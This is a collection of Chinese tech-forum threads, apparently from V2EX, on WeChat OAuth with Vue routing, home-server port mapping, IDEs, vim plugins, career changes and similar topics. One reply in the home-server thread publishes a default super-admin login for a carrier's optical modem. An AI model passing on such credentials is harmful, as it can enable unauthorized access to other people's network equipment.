{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=code&amp;scope=SCOPE&amp;state=STATE#wechat_redirect\" rel=\"nofollow\">https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=code&amp;scope=SCOPE&amp;state=STATE#wechat_redirect</a>\r<br>\r<br>\r<br>我用的 vue 来管理路由。\r<br>\r<br>现在遇到的问题是  授权 url  redirect_uri   我填写的地址 带了 # 号， 导致不能授权，有遇到过这样问题的嘛？</div>"], "reply": "26", "tittle": "微信授权遇到点问题，能帮忙看看嘛？", "comment": ["url_encode 一下啊", " \r", "\r", "感谢你的回复，我试过了。\r", "\r", "\r", "\r", "encode 之后，通过那个获取 code 的 url 跳转之后\r", "变成了\r", "\r", "\r", "\r", "。。。。路由被破坏了。", "微信就是这样设计的。看来你要让路由更聪明点自己处理查询串，或者把你 hash 带到查询串里面再由后端跳到一个没有查询串且 hash 也正常的地址", "微信的跳转是跳转到页面的，而不是页面上的锚点。\r", "你的 url ：'http://www.abc.com/acts/#/share/20170101/ '改掉'#'，'#'号后面代表是锚点；'http://www.abc.com/acts/#abc/dde'和'http://www.abc.com/acts/#/share/20170101/ '是指向同一个页面的。", "redirect_uri 你用一个新网址，这个网址对应的程序是没有界面的，后端处理完之后，你自己跳转回 vue 做的页面", "我想知道你用前端接微信返回的话你准备怎么处理 code 和 state ..?\r", "\r", "跳转链接和返回本来就是后端活儿 ... 包括 state 的验证也是 ...\r", "\r", "你需要做的是跳一个类似 /wx/authorize 这样的 URL 由后端 redirect 到微信的 authorize 去 ...\r", "\r", "同时 redirect_uri 也是后端维护的 ... 接收返回获得用户的信息和登录态才会再跳回前端 ...", "有，去年年底某次改版改掉的，正好项目刚上线，客户反馈过来查了很久，蛋疼。之前都可以用\r", "\r", "解决方案:\r", "\r", "在执行前端 app 前预先处理 url ，直接 push 一个 statue 。\r", "具体来说就是在 app.js 的头部加入\r", "var search=location.search;\r", "if (search.length>0){history.pushState({},'web title','#wechatreturn'+search);}\r", "\r", "不知道那些说之前就这样设计的，还有说跳转链接和返回的后端的活的是几个意思。\r", "\r", "做一个接口， Post 一下获取登录地址，直接 location=跳转过去就可以 oauth 登录了。\r", "\r", "再做一个接口，把得到的 search 直接 Post 到接口取得登录信息就可以了。\r", "\r", "如果前端或者后台只熟一个，这么自信去评论自己不熟的部分不好", " 这个 api 要支持 h5 才行吧", " \r", "\r", "首先，如果是说浏览器兼容性的话，这不过是跑 app 自己的 router 之前先做个自己的简单 router 罢了。\r", "\r", "其次，如果是说后台的话，前端是 ie6/h5/app/客户端,和后台 api 没什么关系吧？", " 这里似乎有我事儿我就再多句嘴 ... 所以你是怎么处理的 code 和 state ..? \r", "\r", "state 的意义是保证回调是由当前用户发起的 ... 也就是你要判断传出和传入相等 ... 前端额外存 ..?\r", "\r", "那 code 呢 ..? 无论如何还是要丢给后端吧 ... 既然如此为什么不直接让后端来接这个回调 ..?", " \r", "\r", "\"跳转链接和返回\"\r", "\r", "和怎么处理 code 与 state 有什么关系？\r", "\r", "后端只需要提供是否能验证的功能。\r", "\r", "至于验证成功后怎么处理怎么跳转怎么显示，这是前端的事情，为什么要交给后台来处理？\r", "\r", "让后台来处理调整，那岂不是前端的结构和入口要跟着后端来？前端页面结构重构一下的话还必须要要后台配合？", " \r", "\r", "简单来说，前台本身是 /index.html#xxx\r", "后来需要加入新版本，对 ab 测试，新版本地址是 /v2/index.html#xxx\r", "又要加英文版本，英文版的地址是 /en/index.html#xxx\r", "\r", "这个项目难道应该通过后端来接这个回调？", "做个自己的跳转页面吧，把当前页的  url 做成一个参数穿个跳转页，自己处理就好了", "vue 路由用 history hash 吧", "我记得 redirect_uri   不能带任何参数", "我的解决办法是放弃用 history 模式，改用 hash 模式。\r", "可以借鉴我的线上项目， ", " 我觉得问题是微信授权后要做什么吧，比如至少基本授权拿到用户的 open-id ？那样的话拿到 code 后需要 appid 和 appkey 去取用户的 open-id ？这一步如果在前端做的话，是要把 appkey 也写到前端去么？这部分就是我一直没想明白的。", "没错的，微信是这样。我在 Angular 里手动解析跳转回来的 URL ，然后取 code 出来", " \r", "\r", "微信授权后本质是做个登录的动作。\r", "\r", "所以需要把登录成功与否的信息返回给前端啊。\r", "\r", "前端收到 code/status,发给后端进行登录。\r", "\r", "登录成功的话返回系统用户 id/openid/token 之类。\r", "\r", "不然你准备怎么把用户信息传给前端，让前端再发个请求用 cooke 里的 session 判断吗？还是作为跳转的参数？\r", "\r", "数据的归后端，浏览器的表现归前端。", " 不管你前端几个版本，微信授权都应该是一个独立的服务，给前端调用。\r", "比如我同时几个 web app 都要用同一个服务号来授权，难道每一个 web app 都重复写一套授权逻辑？", " \r", "\r", "对啊，这就是我的意思啊。\r", "\r", "微信授权应该是服务接口，而不是跳转页面啊。\r", "\r", "按他们的说法，做一个 wx/authorize ，改跳转到哪个 Webapp 呢？还是每个 webapp 写一个接口？", "我觉得微信授权好像没前端（ h5 ）什么事啊，开始跳转到微信页面，用户授权，在跳转回来，通过 code+appid+secret 获取 access_token,再获取用户信息，这应该由服务端处理（不可能说把 secret 暴漏给前端吧）   \r", "这整个过程 h5 如果硬要加进来，反而变的复杂了", " \r", "\r", "复杂在哪？\r", "\r", "前端要做微信首先必然要做跳转操作。所以把跳转操作全放在前端是最好处理的。\r", "\r", "后台就是做两个接口。\r", "\r", "一个是 func(session/token,returnurl){\r", "  if !Validate(returnurl) return http.403\r", "  MakeState(token)\r", "  return wx.getAuthUrl()\r", "}\r", "\r", "一个是 func(prarams){\r", " if wx.validate(prarams) token=prarams.token\r", " openid=wx. getUserinfo(token).openid\r", " return User(openid).id\r", "}", " 是事情变的复杂了，不是代码变的复杂了   \r", "本来没前端的事呢 现在你前端要写代码，要去跟后端交互了   \r", "本来后端一个 controller 就可以解决了 现在要拆成 2 个接口了   \r", "不是说前端不可以这样做，只是觉得没必要这样做", " \r", "\r", "首先，后端本来也需要两个 action 。只不过这个 action 是否负责渲染 html 的问题。\r", "\r", "其次，本来也有前端的事情，只不过前端是写模板文件还是写 html+hs 的问题。", "请问楼主最后怎么解决的呢？"]},
{"content": ["<div class=\"topic_content\">好多转存到盘里的文件名都带着推广广告，\r<br>看着好烦，一个个去重命名效率太低了\r<br>\r<br>现在想找一个批量重命名文件的功能，\r<br>我想给要个关键词替换，或者关键词移除功能\r<br>\r<br>借助 es 文件浏览器倒是有批量重命名\r<br>但是 es 的功能太简单了，只能所有文件名全部去除，然后结尾递加数字。。。</div>"], "reply": "9", "tittle": "有木有度盘批量重命名的油猴脚本？", "comment": ["客户端抓包，模拟 api 调用", "是那种澳门赌场的广告么", " 澳门赌场不都是压在视频里的咩，名字里好多都是网址啥的", "有。。。。\r", " 安装了，可在网盘界面没生效啊。。。＝＝ 我另外那个从网盘直接下载的脚本就生效了的说", " 啊，不知道啊。。。我也不知道脚本作者是谁，刚好记得前几天看到，就发给你了。。。", "油猴脚本没用过，但是我记得有第三方 FUSE 客户端啊，挂载到一个目录你就可以随便折腾了", "老司机改完名字记得分享一下文件名哦~~~", " 这是普通车次，一些影视剧罢了。不是高速列表"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.amazon.cn/\" rel=\"nofollow\">https://www.amazon.cn/</a></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>截图\n<img alt=\"z.cn\" src=\"http://ww1.sinaimg.cn/large/4f4f9ba7gy1fcs4jxf33ij21gl0tm47o.jpg\"></p>\n</div></div>"], "reply": "25", "tittle": "亚马逊的顶部导航栏,搜索栏怎么丢了?", "comment": ["我刚也发现了,郁闷,想找一本书都不行", "啊,对啊,好奇怪,先截图保存", "。。。我打开还有", "哈哈，最近怎么都跟导航栏过不去", "恢复了,是不是测试的原因?", "歪个楼，我觉得亚马逊自己的移动客户端不能买 Kindle 书，非常非常脑残。", " 是不是因为 apple 禁止通过其他渠道内购,为了统一移动端的体验,android 版也不搞?", "多刷新几次，一会有，一会没有。", "亚马逊心愿单不能改名, 两个月了, 问题还在", "感觉在灰度测试新首页 然后看转化率", "联系客服告知是系统升级，还说要大约中午恢复，这么大的站升级能把主要功能给升没了，真是糊弄不懂的。没有了顶部导航、搜索、登录，和整站瘫痪无异了。\r", "\r", "目前在抽风，一会有，一会没有。", "2017-02-16 09:48:08 还是没有", "最近的网站怎么都和导航栏干上了", "\r", "\r", "把最后的 test 改成要搜索的内容", "不是新首页吧，，，应该只是出了点问题或者在测试。没有导航搜索的时候侧边也没有，连 LOGO 也没有了。。怎么可能是新首页", " kindle 客户端可以买，当然如果是苹果就……", "整个首页的广告栏都歪了，这么大的网站搞成这样。。。", " 应该是对接出了点问题，不然光测试的话。可以新建测试不是", "这应该算一个事故了", "mobile 版的还是可以用", "用 z.cn 跳过去就好啦，我一般都这样", " 心愿单被人玩坏了，拿去乱加诱导名字诈骗，中亚一关了事。我想你是等不到能改名的那一天了。我好几个心愿单乱七八糟的名字看着烦死了。连阅读权限都不能改了，改了点确认没效果。", " 　 kindle 上使用 一键支付，还是可以直接买书的。", " \r", " \r", "更多时候是 iOS 设备使用 Kindle ， Kindle 硬件不常用。"]},
{"content": "", "reply": "10", "tittle": "有没有常用的 vim 插件，大家推荐一下", "comment": ["spf13", "\" version control\r", "\" git\r", "Plug 'tpope/vim-fugitive'\r", "Plug 'airblade/vim-gitgutter'\r", "\r", "\" completion\r", "Plug 'valloric/YouCompleteMe'\r", "\r", "\" tool\r", "Plug 'scrooloose/nerdtree'\r", "Plug 'jistr/vim-nerdtree-tabs'\r", "Plug 'ctrlpvim/ctrlp.vim'\r", "Plug 'Raimondi/delimitMate' \"automatic closing of quotes, parenthesis, brackets, etc.\r", "Plug 'tpope/vim-sensible' \"provide some command preview\r", "Plug 'thirtythreeforty/lessspace.vim' \"clear the whitespace in the end of line automic\r", "Plug 'junegunn/vim-easy-align'\r", "\r", "拿走不谢", "既然你这样问，我只好贴配置了， ", "vim-go", "php - github.com/lvht/phpcd", "\r", "Vim 异步语法检查，再也不用担心打开保存文件卡顿了，仅支持 Vim8", "\r", "网速好可以看看， ", "如果你是服务器维护人员，还是不要用插件，因为你登上机器会发现没有你顺手的插件", "startify 自訂起始頁\r", "\r", "AutoSave 自動存檔\r"]},
{"content": "", "reply": "12", "tittle": "求一个可以下载各种编程语言文档的网站", "comment": ["朋友知道 dash 么", "dash velocity zeal", "日经贴啊...\r", "dash", "dash 无双", "感谢楼上所有人", "部分文档， velocity 貌似只能下载最新版的，例如 Grails ，如果想下载之前的旧版本，该怎么办呢？\r", "自行制作 and how ？", "看云的广场里面有很多技术文档 ", " 你别什么帖子都推广网站啊", "dash", "windows 下用 zeal ， ", " nice"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>\nfunction SpecialArray() {\n  var values = new Array();\n\n  values.push.apply(values, arguments);//这句怎么理解\n  console.log(this)\n\n  values.toPipedString = function() {\n    return this.join(\"|\");\n  };\n  return values;\n}\n</code></pre>\n<p>我想问一下其中\nvalues.push.apply(values, arguments);\n这一句该怎么理解</p>\n</div></div>"], "reply": "5", "tittle": "js 里面 push.apply 小问题", "comment": ["等价于 Array.prototype.push ，再去看看 apply 是干什么的就懂了", "这段代码的目的是把 SpecialArray 的参数按原样一个个传进 values 数组，查查 apply 的具体用法吧。", "为了把未知个数的参数透传给 push", "主要研究一下 apply 的用法吧", "就是把调用参数一个个 push 进去 values 呗。这种用法习惯了就好\r", "其实这也算是一个常见技巧，因为 arguments 不是一个 array 有点像 array ，这里就构造出一个 array 内容都是 arguments 那些内容，顺手还把产出的这个对象加了个方法"]},
{"content": ["<div class=\"topic_content\">用的电信 100M ，记得之前是可以的，今天又搞了下发现不行了。现在是光猫接了个小米路由器，在光猫上找不到端口映射的设置，小米路由器倒是有，设置之后没用。是不是现在电信弄不了了</div>"], "reply": "27", "tittle": "自家电信宽带搭建服务器", "comment": ["端口映射不行的话，应该先确定下光猫是不是获取到的公网 IP ，要是是内网 IP 的话，就只能用 ngrok 之类服务来实现了吧，或者打客服电话让给公网 IP 。\r", "Ps ：我用的广州联通，有公网 IP ，路由器 K1 刷了华硕固件，绑定 Aliddns,路由器上开好 VPN 服务，在外面用公共 wifi 的时候直接拨回家，无痛穿墙&去广告，还能一定程度上保证安全。", "80 端口？看看 IP 是不是 100 开头，光猫自拨号？桥接？", "确定有公网 ip ？现在很多都没有了，便宜", "可能没公网 ip+公网 ip 屏蔽 80 端口，别折腾了。", "电信光猫有些型号不同用户名登录进去不一样\r", "例如我家的用 telecomadmin nE7jA%5m 登录进去就有所有功能，用 useradmin 登录进去就只有几个简单的功能。", "我这边光猫要管理员帐号进入才有端口映射的选项。普通帐号进去只能开关 wifi.", " 电信光猫真良心啊，联通光猫， ttl 线开 telnet ，特么后台删的一干二净", "说得不清楚，是路由器还是光猫拨号，代理用得哪个端口", " 求问有无 AliDNS 插件。梅林固件飘过", " #9 梅林有 Aliddns 吧", "应该没封 443 ，可以用 443 端口", "用花生壳内网版解决~", "frp 也不错", "80 口应该被封了吧", "可以的，我就在用电信宽带开放 443 端口，直接在路由器上映射端口就 ok ，记得服务上防火墙要开了……", "1. 如果你之前有过类似业务升级，那么他那边会给你重设，原来的公网 IP 会丢，让客服给你弄\r", "2. 之前也有人说了，不同账号密码功能不一样，端口映射好像在“应用”选项卡里，当然我可能记错了。还就是 DMZ 好像不太好用\r", "3. 封 80 端口的情况我没遇到过", "找到光猫的超级管理员账号，模式改成桥接，然后在路由器拨号就行了", "100M 是下载还是上传啊 大兄弟.", " 用光猫盒子上的账号登进去没有改模式的，超级管理员账号怎么找？", " 可能型号不同不一样吧，我是这样改的\r", "\r", "其他的最好上网搜一下", " 我是刷的固件里面自带 aliddns 的，没有单独的插件诶", "电信现在很多地区分配的都是 10.xxx.xxx.xxx 这样的内网 IP", " 呃，眼残，没注意到。", " 我发现，然并卵，域名后台并没有更新 IP 地址。。", " 我的有更新诶，每天都收到几次阿里 的 “云解析记录修改通知”邮件", " 谢谢，之前用老的猫用路由器拨号是没问题的。最近换了光猫就不行了，平时就自己玩玩儿，买台 ECS 感觉比较浪费啊～", "非常感谢大家的回复，楼主最后还是放弃折腾了，撸代码去咯~"]},
{"content": "", "reply": "41", "tittle": "求 Linux 下 C#和 C++ ide", "comment": ["VS Code", " 要 IDE", "clion?", "c++建议用 QtCreator ，无缝支持 CMake ，速度比一票 Java 系快很多", "JetBrains Rider\r", "\r", "MonoDevelop\r", "楼上+1 ，\r", "MonoDevelop ，正在下载，就现在。", "Build MonoDevelop from source ", "推荐 vsc", "那为毛非要在 linux 下面开发 c#", "clion +10086", "Linux 下最好的 C++IDE 肯定是 clion 啊...", "c++的话， vscode 其实够用，版本控制啊， makefile 啊，直接 shell 搞定。。。", "vs code +1", "c++投 qtcreator 一票", "我投 clion 一票", "C++当然是 clion 了", "没有推 emacs 的？", "标准答案就是 jetbrains 全家桶 Rider CLion", "CLion or Vim", "vim + tmux", "C++ IDE 的话 Clion + 10086", "clion", "Kdevelop", "slickedit 怎么没人推荐？\r", "clion 支持 CMake ，还是不错的。", "Eclipse, CLion", "clion 然后安装 vim 风格，很好用啊", "Vim", "clion 或者 vs2017", "Vim", "vim", "vscode,no another", "一直 vim 多 但是好奇的是为什么没人提老牌的 KDevelop 呢", "clion", "首先全家桶的软件，赏心悦目！", "clion 好评啊！", "原来只有我用 Code::Blocks", "CLion ，但是基于 cmake 的，不过有支持 makefile 的插件。不想用盗版的话， kdevelop 5 也不错。 mono 没用过， vscode 改代码还行，写就有点弱了。", "VS Code", " 之前也用，但有两个缺点让我换了，一个不支持汇编，还有一个，会低概率段错误(wxgtk 的 string 的锅)。。。", " 可以使用 flatpak 包管理工具安装最新的 MonoDevelop \r", "\r", "\r", "\r", "flatpak install --user --from ", "\r", "\r", "\r", "flatpak 打包全部依赖，然后 namespace 隔离，这些体验都很好。", "clion+10086\r", "jb 系的无他就因为 vim 插件完美使用。。所以其他系的都是渣渣"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>回望 2016 年，在年末之前新增的 APP 数量多时呈现下降情况，基本在 12 月初才慢慢开始回升，而面对如火如荼的移动应用市场，整个 APP 行业却没有展现出大伙希望中的蓬勃之势，而其中：</p>\n<p>1.资本寒冬波及到了 16 年 APP 市场，开发者开始更加谨慎</p>\n<p>2.国家出台政策规范应用，让不少不规范的劣质品难以用过审批上线</p>\n<p>那么受到这些影响， APP 市场在小幅缩减的同时，也在格局上发生了些许变化，其中最明确的是与手游一致， APP 也开始大步迈向高质精细化，同时，一些变现能力较弱的 APP 类型也逐渐开始被另外一些类型的 APP 挤下舞台。</p>\n<p>那么对于处于增长阶段的应用类型，笔者将从 APP 测试方面入手，为大伙带来各类应用的突围之道：</p>\n<p>增长明显的应用类型无疑是符合用户消费升级的</p>\n<p>•教育学习类</p>\n<p>这类应用主要的本质在于在线资源的分享或者售卖，那么对于 APP 测试方面，主要需要在网络连接、应用功能方面以及兼容性适配方面着重进行测试。首先，除开在线文章或者教材题库的阅读以外，教育类 APP 更多的重心是放在在线教育和视频学习上的，那么如果在弱网情况下，资源的读取过慢，造成浏览观看体验下降，是对用户耐心与好感度的加大损耗；再来，教育类应用涉及的人群也是极其广泛的，每个人对应用功能的需求不同，每个人的硬件终端差异也存在，那么针对这种情况进行全面的功能测试与兼容性测试也是非常有必要的，它决定了你 APP 的影响范围。</p>\n<p>•金融证券\n这类应用的质量要求就比较高了，从 TestBird 针对证券类 APP 测试报告了解到，金融证券类 APP 对安全方面的重视程度较高，从注册开户起始到各个操作环节的把控都是较为严格的，因为其不仅仅涉及到了个人信息的安全，更是与财务的流通息息相关，一旦在某个环节出现错误，那么可能导致用户与开发商的双重损失。</p>\n<p>在 APP 测试方面，金融证券类 APP 主要要深入进行安全测试与全面的功能测试，尽量保证问题出现的概率降到最低，减少发生损失的可能，这是对用户的负责，也是对品牌形象的巩固。</p>\n<p>•旅游酒店</p>\n<p>恰巧刚刚过完情人节，估计不少朋友都是用 APP 订的酒店，那么针对这类应用，关键还是在于酒店信息的丰富、真实程度以及下单操作的安全性与便捷性，由于涉及到了财务流通，那么安全性测试也是必不可少的，同时特别是涉及到下订单这套流程中的功能点，也是重要测试方面。\n只要保证使用的流畅度以及减少 Bug 的发生频率，对于用户体验方面的提升也是明显的（当然包括酒店信息种类、折扣福利等方面影响）。</p>\n<p>本文系 TestBird 原创，转载请注明</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "从 APP 测试角度看新增长应用类型如何取得优势", "comment": []},
{"content": ["<div class=\"topic_content\">原文见： <a target=\"_blank\" href=\"http://news.mydrivers.com/1/520/520951.html\" rel=\"nofollow\">http://news.mydrivers.com/1/520/520951.html</a></div>"], "reply": "目前尚无回", "tittle": "Google 说，他们攻破了 SHA-1 算法……", "comment": []},
{"content": "", "reply": "59", "tittle": "小舅子想转行做 IT，辞职自学了几个月，没工作经验，找工作挺难找的，各位有建议么？", "comment": ["降低门槛，去外包公司上个一年半载。如果连外包公司都不要，就需要自己搞几个小项目了。", "不好找", "如果有学历，可以尝试去当实习生。现在很多公司必须要有学历证明！\r", "\r", "问题是他的技术如何？北上广深杭，我不觉得工作难找！\r", "\r", "我所知道杭州要很多 Java 的。", "换个当老板的姐夫", " 这....", " 这个靠谱", " 666", "人生不如意，转行写程序\r", "\r", "应届生 10K+起步，全民做 IT ！！！", " 就这样定了！哈哈", " 如果楼主的 Id 少了 279....", " 666", " 就服你了", "上个培训班，只要别太笨，都能找到工作", "如果楼主的 Id 少了 279         + 1", "V2 里一大把类似这样的帖。。。\r", "善用搜索", " 这个叼 鹅厂横着走。。。", " 666666 的不行、、、话说没有工作经验就从网上 down 项目，自己研究透了不就行了。。", " 换个当老板的姐夫 靠谱", " 这个靠谱", "找创业公司。\r", "\r", "外包公司门槛妥妥的比创业公司高。\r", "\r", "当然，是将倒闭的创业公司……\r", "\r", "别问我怎么知道的。", "接着找，一定能找到的，刚培训出来的就是缺实际的经验，只要有公司肯要，坚持两年不辞职，出来就好了．之前互联网很多都是自学出来的，云帆的ＣＴＯ扶凯也是中专毕业，自学的。最重要的坚持呀，加油吧，少年", "年纪不说，学历不说，要怎么建议？", "   \r", "93  年，深职院的专科，在学校也是计算机相关专业，主要是毕业后的第一份工作跟 IT 无关", "  \r", " \r", "\r", "不瞒你说，我之前在鹅厂的时候就是因为这个原因换了 ID ，\r", "参考 roxma 那一行\r", "所有亲戚问我怎么转的，我都是直接说，你别想着转行出来就几万你就可以转，任何年纪开始都是从头开始，也就 5-6 千。转行就上万。。几乎没看到过", "问别人没用, 看他自己", "  我见过很多！我朋友培训班出来，从本来 3 千直接现在 1 万。而且他们班平均工资 12K 。\r", "\r", "不是说吹牛。这是我身边朋友的真实情况。 世界是很大的，你应该出去看看！", " 93 年还年轻，大有可为，做前端，没那么多限制，别人主要看你的作品", "月经贴...每个月都会看到 我的某某某要学某某某而某某某,我该 xxxx 样.", " #26 \r", "楼上说的是，转行从头开始 5 、 6K ，没见上万。\r", "你说的培训完，是以从头开始的身份找的么？\r", "如果培训完谎称 2 、 3 年经验，得到的上万去反驳人家那句从头开始 5 、 6K...\r", "只能说判断条件都不一致。", "我有个大学同学从数学老师转的，自学了 7 个月，上来就税前 1 万，比我高= =", " 可能我理解不一样吧\r", "\r", "我的理解，“开始都是从头开始”，培训出来跟自学也是通过自身努力去学习技术。在其他行业也是从头开始。\r", "\r", "关于谎称的工作经验，这我就不多说了。技术过关人家就要。如果随便说几年就可以，自学的也可以随便说啊！（这其实可以说一种面试策略）\r", "很多真有 2 、 3 年经验的人，技术连培训出来的都不如！他们只是业务熟悉而已。", "问题是你是鹅厂的这个还用来 v2 问……", " +1...\r", "直接内推进鹅厂，美滋滋", "我自学二年找个工作都很累", "好好学 降低薪资要求 多面试", " 说不定你老师是搞算法的。", "投互联网公司,随便什么公司先进去,不要要求工资,干一两年再跳槽", "要看自学的程度怎样吧，时间衡量不出来", " 楼主已经不在鹅肠了", " #25 我朋友的姐夫，也是辞职自学 JAVA 半年，年前去京东谈的 15k 年后入职……", " 新蓝领", "先找个工资低的小公司", "写点小东西放网上，整个 vps 才一个月 5-10 刀\r", "\r", "要么有经验，要么有作品", "我觉得我转行的时候起步也是很低的，从 2-3k 开始，还是要静下心来做事", "如果暂时没有经济压力，可以先找个 IT 公司免费实习", "建议就是楼主把问题说清楚，目前一点有用信息都没有。\r", "\r", "之前做啥的？学历咋样？几个月学的啥？学到哪？有作品？之前面试的情况？\r", "\r", "哪怕什么都不说，你帖份简历可好？", "说实话 如果人人学几个月都能当码农 那码农和农民工有啥区别。", "忽然想到一个问题  是不是你工资高 影响了你小舅子？", "(´･_･`) 做 IT ？到底是做什么 IT ？", " 什么是 V2 ？", "全民都想做 IT 的时候 说明已经晚了", "作 IT 具体是作什么？如果是技术型的话，没什么可话说，甩几个作品到网上，然后以此为标准投简历就是了。有兴趣的人自然会看。", " V2 没搜索？", " 我也是自学的，现在在同学推荐下进他们公司实习了，。。很难找工作，确实 自身技术也不太好，你自学的什么找工作啊？", " 自学的时候能找到工作一般都是一开始做简单的东西", " #31 \r", "\r", "“ 2 、 3 年经验”，这可不叫从头开始。\r", "不是“从头开始”的身份，薪资自然也不是对应“从头开始”的。\r", "谎称 2 、 3 年成功了，得到的薪资自然是对照 2 、 3 年开具的。\r", "\r", "条件都不一致，如何反驳那句从头开始是多少。", "一个从头开始者，伪装成“非从头开始”的身份得到的待遇，这是从头开始的待遇么？", "我相信人的能力有高低，存在有人真正从头开始比上述待遇高的事实。\r", "只是不认可你用于反驳的例证。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>使用：\n选择需要搜索的文本，共享（ Share ）， Workflow ， Magnet ，选择搜索引擎，挑选搜索结果。选择的结果的磁力链接会被复制到剪贴板。</p>\n<p>可以配合 115 等离线。</p>\n<p>步骤：\nStep01：\n<img alt=\" Step01.jpg\" src=\"https://ww2.sinaimg.cn/large/4d4c0419gy1fctbepdfvtj20yi1pcb2c.jpg\">\nStep02：\n<img alt=\" Step02.jpg\" src=\"https://ww2.sinaimg.cn/large/4d4c0419gy1fctbet17w6j20yi1pc1ky.jpg\">\nStep03：\n<img alt=\" Step03.jpg\" src=\"https://ww2.sinaimg.cn/large/4d4c0419gy1fctbex1ta8j20yi1pc7jo.jpg\">\nStep04：\n<img alt=\" Step04.jpg\" src=\"https://ww2.sinaimg.cn/large/4d4c0419gy1fctbeyfr3lj20yi1pc4ad.jpg\"></p>\n<p>地址：\n<a href=\"https://workflow.is/workflows/856fbe4bc186498b87dda57b818574e8\" rel=\"nofollow\">https://workflow.is/workflows/856fbe4bc186498b87dda57b818574e8</a></p>\n</div></div>"], "reply": "8", "tittle": "[WorkFlow]没事撸了一个搜寻磁力链接的 WorkFlow", "comment": ["再写一个一键购买营养快线的吧(｡･ω･｡)ﾉ♡", "然后图片全炸了", "666", " 图片是放在渣浪图床上的 我这边是可以打开的", " 看了下原因好像是 ssl 证书的问题，渣浪现在还不支持 https 吧", " 渣浪的 HTTPS 是好的啊", "然后粘贴到我写的这个 tansmission vue 前端里就可以愉快的下载了\r", "\r", "（捂脸", " 应该是可以做成自动提交的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>自卖自夸： <a href=\"https://github.com/roxma/nvim-completion-manager\" rel=\"nofollow\">https://github.com/roxma/nvim-completion-manager</a></p>\n</div></div>"], "reply": "2", "tittle": "快! 可拓展！异步! 的 nvim 智能补全框架！支持 C/C++， Python ， JavaScript 等等......", "comment": ["(((o(*ﾟ▽ﾟ*)o)))赞！！！！！", "滋词滋词，有空试试"]},
{"content": ["<div class=\"topic_content\">最主要的是想知道：\r<br>1 ）从测试角度考虑，内外网测试有什么区别\r<br>2 ）针对安全性，有什么需要注意的\r<br>3 ）外网测试的重点和难点\r<br>\r<br>个人没有外网的经验，身边同事也没有搞过外网的，其他需要注意的还请各位大神提醒，谢谢了\r<br>\r<br>提前谢谢 v2 各位大神，谢谢</div>"], "reply": "14", "tittle": "各位好，想咨询个问题，我们有个网站目前只对内网开放，打算对外网开放了，在对外网开放过程中，需要考虑哪些问题，谢谢", "comment": ["自己顶顶", "请备案...哈哈！", "最要是看安全性吧，防止密码被爆破", "安全性。\r", "\r", "如果没经验的话最后用类似白名单的方式。\r", "\r", "用 ngxin 反代 80/443 端口。\r", "\r", "只反带必须的部分页面。\r", "\r", "必要的地方采取验证码和访问频率限制", "装防火墙", "工信部备案？\r", "脑子里第一个跳出来的是这个（服务器在国内的话）", "域名备案，如果固定 ip 的话还要 ip 类的备案才能开 80 端口", "先工信部备案，然后再去公安部备案。", "安全性：要考虑到被别人攻击的风险，就加一些 cdn 防御", "现实点，在对外网开放过程中，需要考虑到日 ip=0 这个严峻问题", "sql 注入", " 好尴尬啊～", "如果网址准备发到 V 站来的话，一定要准备好怎么防 D 。", "没啥区别\r", "如果真有区别，就是防止竞争对手 DDOS ……\r", "前提是你们开发内部系统对安全性不糊弄"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一开始是想把 Atom 的 onedark 移植到 Qt Creator 里，过程中凭自己喜好有一些改动。现在用 Flat Dark + onedark ，感觉非常爽。</p>\n<p>另外要安利一把 Qt Creator ，它并不是只可以用来写 Qt 程序，其它的 C/C++也是可以的。速度相对于 Eclipse 和 Clion 快不少，我想要的功能也都不缺。</p>\n<p><a href=\"https://github.com/busyluo/qtcreator-onedark\" rel=\"nofollow\">https://github.com/busyluo/qtcreator-onedark</a>\n觉得不错给个星- -</p>\n</div></div>"], "reply": "16", "tittle": "分享一款 Qt Creator 的配色，自我感觉非常良好。", "comment": ["感觉 QT Creator 在编辑代码方面还是弱了点.所以我现在都是用 clion 写 QT", "感觉 One Dark 比 Solarized Dark 要好看很多，不知道是不是 Solarized 看多了的原因", " 我是一直都觉得 Solarized 不算好看，但觉得好看的人很多。", " 可能是我没用到那些功能，可否说一下你使用 Clion 写 Qt 的原因。", "哈哈哈，我喜欢 Solarized dark 。你这个也挺好看。不过我最喜欢 spacemacs 的配色。", " 一方面是 qt creator 的编辑器对 vi 快捷键的支持没有 jetbrains 的全面,重构方面的功能好像 qt creator 没有.当然最主要的原因可能是因为我喜欢 clion.", "一直用 Solarized 是觉得省眼睛而不是觉得好看， dark 之类的，其实在你同时浏览其他的浅色背景的页面（比如预览网页版）／ app 时候，冲突更大 更费眼睛-。-", " 请教一下， IDE 的重构是个什么样的功能？", "比如要改函数的名字,变量名字,可以做到所有调用的地方一次性改. 删除文件或者函数的时候提示有调用等等.", " 改名字这个功能应该是都有的。 不过删除提示有调用这个功能 Creator 确实没有。", " 还有一个严重问题,Win10 下 QT Creator 有时会崩溃,崩溃以后没有保存的代码就无法恢复.我是用了好一段时间的额 QT Creator 才换 CLion 的.", " QtCreator 用了某个版本很稳定了就不要随意换，新版本经常搞出各种花式崩溃", " \r", " \r", "我也是 Win10 ，还跟各种 beta 版本，没有崩溃过，奇怪了。", " QtCreator 容易崩溃的情况有预览 qml ， debug 很深的层变量过多然后去断点单步操作过快", "看了下紫色受不了。。只用 护眼绿背景色。\r", "不过 Qt creator 确实不错，感觉是 linux 最适合的 c IDE", " 是紫色吗，是深灰色吧。"]},
